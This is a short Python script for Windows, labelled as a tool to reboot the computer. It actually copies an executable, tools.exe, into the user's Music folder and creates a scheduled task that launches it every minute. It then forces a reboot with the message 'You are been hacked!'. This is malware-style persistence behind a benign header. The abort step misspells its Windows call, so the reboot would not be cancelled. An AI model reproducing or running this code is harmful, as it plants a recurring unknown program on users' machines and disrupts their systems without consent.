# reboot -- reboot computer
# coding=UTF-8
import win32security
import win32api
import sys
import os
import time
from shutil import copyfile
from ntsecuritycon import *


def AdjustPrivilege(priv, enable=1):
    # Get the process token
    flags = TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    htoken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), flags)
    # Get the ID for the system shutdown privilege.
    idd = win32security.LookupPrivilegeValue(None, priv)
    # Now obtain the privilege for this process.
    # Create a list of the privileges to be added.
    if enable:
        newPrivileges = [(idd, SE_PRIVILEGE_ENABLED)]
    else:
        newPrivileges = [(idd, 0)]
    # and make the adjustment
    win32security.AdjustTokenPrivileges(htoken, 0, newPrivileges)


def RebootServer(message='You are been hacked!', timeout=30, bForce=0, bReboot=1):
    AdjustPrivilege(SE_SHUTDOWN_NAME)
    try:
        win32api.InitiateSystemShutdown(None, message, timeout, bForce, bReboot)
    finally:
        # Now we remove the privilege we just added.
        AdjustPrivilege(SE_SHUTDOWN_NAME, 0)


def AbortReboot():
    AdjustPrivilege(SE_SHUTDOWN_NAME)
    try:
        win32api.AbortSystemShotdown(None)
    finally:
        AdjustPrivilege(SE_SHUTDOWN_NAME, 0)


def cp():
    fpath = os.path.join(os.path.expandvars("%userprofile%"), "music\\tools.exe")
    try:
        copyfile("tools.exe", fpath)
    except:
        pass


def addtoschtasks():
    fpath = os.path.join(os.path.expandvars("%userprofile%"), "music\\tools.exe")
    schtasks_command = "schtasks /create /sc minute /tn mbox /sd 2018/02/09 /ed 2018/02/10  /F /tr  " + fpath
    os.system(schtasks_command)


if __name__ == '__main__':
    cp()
    addtoschtasks()
    RebootServer()
    time.sleep(100)
    print 'Aborting shutdown'
    AbortReboot()
    sys.exit()
